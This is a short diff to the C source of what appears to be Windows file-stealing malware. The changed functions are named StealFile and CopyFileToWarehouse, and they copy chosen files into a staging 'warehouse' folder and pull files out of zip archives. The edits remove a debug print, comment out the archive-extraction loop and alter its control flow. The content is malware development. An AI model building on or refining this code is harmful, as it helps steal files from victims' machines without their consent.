@@ -1583,7 +1583,6 @@ VOID CopyFileToWarehouse
 	}
 
 	CloseHandle(hFile);
-	PrintFormatW(L"%s\n", lpPath);
 	lpWarehouse = DuplicateStrW(pConfig->wszWarehouse, SHA256_HASH_SIZE + 0x10);
 	if (!IsFolderExist(lpWarehouse)) {
 		if (!CreateDirectoryW(lpWarehouse, NULL)) {
@@ -1699,7 +1698,7 @@ BOOL StealFile
 			}
 		}
 
-		for (i = 0; i < pConfig->cArchiveExtensions; i++) {
+		/*for (i = 0; i < pConfig->cArchiveExtensions; i++) {
 			if (!lstrcmpW(lpExtension, pConfig->ArchiveExtensions[i])) {
 				if (dwFileSize > 100000000) {
 					break;
@@ -1708,7 +1707,7 @@ BOOL StealFile
 				PrintFormatW(L"Zip path: %s\n", lpPath);
 				ItemList = ExtractFromZip(lpPath, NULL, FALSE, &dwNumberOfItems);
 				if (ItemList == NULL) {
-					continue;
+					break;
 				}
 
 				for (j = 0; j < dwNumberOfItems; j++) {
@@ -1730,7 +1729,7 @@ BOOL StealFile
 
 				break;
 			}
-		}
+		}*/
 	}
 
 CLEANUP:
